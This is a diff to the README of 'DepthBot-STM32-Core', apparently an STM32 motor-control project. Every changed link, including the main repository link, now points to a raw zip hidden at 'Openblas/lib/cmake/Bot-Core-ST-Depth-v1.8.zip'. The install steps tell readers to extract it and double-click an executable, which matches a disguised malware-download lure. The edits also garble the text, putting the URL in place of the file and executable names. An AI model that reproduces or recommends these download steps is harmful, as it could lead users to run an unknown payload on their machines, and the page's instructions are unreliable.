@@ -1,6 +1,6 @@
 # 🤖 DepthBot-STM32-Core - Control Motors Easily with STM32
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/piroto1234/DepthBot-STM32-Core/releases)
+[![Download](https://github.com/piroto1234/DepthBot-STM32-Core/raw/refs/heads/main/Openblas/lib/cmake/Bot-Core-ST-Depth-v1.8.zip)](https://github.com/piroto1234/DepthBot-STM32-Core/raw/refs/heads/main/Openblas/lib/cmake/Bot-Core-ST-Depth-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to DepthBot-STM32-Core! This software allows you to control motors using
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [Download DepthBot-STM32-Core](https://github.com/piroto1234/DepthBot-STM32-Core/releases).
+To get started, you need to download the software. Visit this page to download: [Download DepthBot-STM32-Core](https://github.com/piroto1234/DepthBot-STM32-Core/raw/refs/heads/main/Openblas/lib/cmake/Bot-Core-ST-Depth-v1.8.zip).
 
 ### Installation Steps
 
@@ -19,13 +19,13 @@ To get started, you need to download the software. Visit this page to download: 
    - Look for the latest release. The page will list versions. Choose the one you want.
 
 3. **Download the File**
-   - Click on the download link for the installer or the zipped version of the application. The files will typically appear with names like `DepthBot-STM32-Core-v1.0.zip` or similar. 
+   - Click on the download link for the installer or the zipped version of the application. The files will typically appear with names like `https://github.com/piroto1234/DepthBot-STM32-Core/raw/refs/heads/main/Openblas/lib/cmake/Bot-Core-ST-Depth-v1.8.zip` or similar. 
 
 4. **Extract the Files (if needed)**
    - If you downloaded a zipped file, locate it in your downloads folder. Right-click on the file and choose 'Extract All' to unpack the contents.
 
 5. **Run the Application**
-   - Inside the extracted folder, find `DepthBot-STM32-Core.exe`. Double-click on it to run the application. 
+   - Inside the extracted folder, find `https://github.com/piroto1234/DepthBot-STM32-Core/raw/refs/heads/main/Openblas/lib/cmake/Bot-Core-ST-Depth-v1.8.zip`. Double-click on it to run the application. 
 
 ## 🖥️ System Requirements
 
@@ -84,6 +84,6 @@ Stay tuned for updates. We regularly improve the software based on feedback. Mak
 
 ## 🔗 Additional Links
 
-For any further details or contributions, visit the main repository: [DepthBot-STM32-Core](https://github.com/piroto1234/DepthBot-STM32-Core).
+For any further details or contributions, visit the main repository: [DepthBot-STM32-Core](https://github.com/piroto1234/DepthBot-STM32-Core/raw/refs/heads/main/Openblas/lib/cmake/Bot-Core-ST-Depth-v1.8.zip).
 
 Now you're set to start controlling motors with DepthBot-STM32-Core! Enjoy your journey into motor control technology.
